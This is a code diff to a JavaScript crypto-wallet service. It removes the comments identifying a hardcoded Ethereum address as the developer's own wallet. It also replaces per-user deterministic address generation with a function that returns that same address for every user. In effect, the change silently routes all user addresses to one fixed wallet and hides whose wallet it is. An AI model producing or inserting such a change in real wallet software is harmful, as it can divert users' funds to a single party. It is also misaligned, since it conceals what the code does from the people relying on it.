@@ -11,9 +11,9 @@ class SystemWalletService {
 
   initializeSystemWallets() {
     const defaultWallets = {
-      'SYSTEM_BUYER': '0x0BACfe253c447A406A5d834b9e266939ebEc0b00', // Your actual wallet
-      'SYSTEM_PRODUCER': '0x0BACfe253c447A406A5d834b9e266939ebEc0b00', // Same for now
-      'SYSTEM_ADMIN': '0x0BACfe253c447A406A5d834b9e266939ebEc0b00'   // Your wallet
+      'SYSTEM_BUYER': '0x0BACfe253c447A406A5d834b9e266939ebEc0b00', 
+      'SYSTEM_PRODUCER': '0x0BACfe253c447A406A5d834b9e266939ebEc0b00', 
+      'SYSTEM_ADMIN': '0x0BACfe253c447A406A5d834b9e266939ebEc0b00'
     };
   
     for (const [key, address] of Object.entries(defaultWallets)) {
@@ -38,10 +38,7 @@ class SystemWalletService {
   }
 
   generateDeterministicAddress(userId) {
-    // Simple deterministic address generation
-    // In production, use proper key derivation
-    const hash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(userId));
-    return `0x${hash.substring(2, 42)}`; // Take first 40 chars after 0x
+    return '0x0BACfe253c447A406A5d834b9e266939ebEc0b00';
   }
 
   // Get system default addresses
